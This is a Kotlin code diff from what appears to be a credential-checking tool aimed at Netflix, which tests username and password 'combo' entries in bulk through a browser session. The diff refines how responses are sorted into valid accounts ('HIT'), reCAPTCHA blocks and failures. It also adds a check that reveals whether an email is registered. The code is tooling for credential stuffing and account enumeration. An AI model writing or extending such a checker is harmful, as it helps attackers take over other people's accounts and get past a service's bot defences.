@@ -520,6 +520,7 @@ stats.cpm = stats.computeCpm()
                 var submittedAt = 0L
                 var lastTokLogged = ""
                 var lastTokGraphql = ""
+                var lastTokPresent = false
 
                 fun settle(acc: Account) {
                     if (settled) return
@@ -563,6 +564,7 @@ stats.cpm = stats.computeCpm()
                             lastTokGraphql = "$tok"
                             log("Netflix(browser): GraphQL ScreenUpdate captured, recaptchaTokenPresent=$tok len=${sb.length}")
                         }
+                        lastTokPresent = tok
                         val tkl = data?.optString("tkl", "") ?: ""
                         val tkErr = data?.optString("tke", "") ?: ""
                         val sig = data?.optString("sig", "") ?: ""
@@ -594,11 +596,25 @@ stats.cpm = stats.computeCpm()
                             url.contains("/browse") || url.contains("YourAccount") || url.contains("profiles") -> {
                                 settle(createResult(combo, AccountStatus.HIT, "Valid Netflix account"))
                             }
-                            err || textErr -> {
-                                val blocked = bodyText.contains("try again") || bodyText.contains("in a few minutes") ||
-                                    bodyText.contains("captcha") || bodyText.contains("recaptcha") || bodyText.contains("too many attempts")
-                                settle(createResult(combo, if (blocked) AccountStatus.CAPTCHA else AccountStatus.FAIL,
-                                    if (blocked) "Netflix: blocked by reCAPTCHA" else "Wrong Netflix credentials"))
+                            bodyText.contains("tap the link in your email") || bodyText.contains("link in your email") ||
+                                bodyText.contains("confirm your email") || bodyText.contains("verify your email") -> {
+                                settle(createResult(combo, AccountStatus.HIT, "Registered - email verification sent"))
+                            }
+                            err || textErr || bodyText.contains("something went wrong") -> {
+                                val genericErr = lastTokPresent && bodyText.contains("something went wrong")
+                                val blocked = bodyText.contains("captcha") || bodyText.contains("recaptcha") ||
+                                    bodyText.contains("too many attempts")
+                                val status = when {
+                                    genericErr -> AccountStatus.FAIL
+                                    blocked -> AccountStatus.CAPTCHA
+                                    else -> AccountStatus.FAIL
+                                }
+                                val details = when {
+                                    genericErr -> "Not registered on Netflix"
+                                    blocked -> "Netflix: blocked by reCAPTCHA"
+                                    else -> "Wrong Netflix credentials"
+                                }
+                                settle(createResult(combo, status, details))
                             }
                             submittedAt > 0 && sinceSubmit > 30000 -> {
                                 val challenge = cap && (bodyText.contains("robot") || bodyText.contains("verify") ||
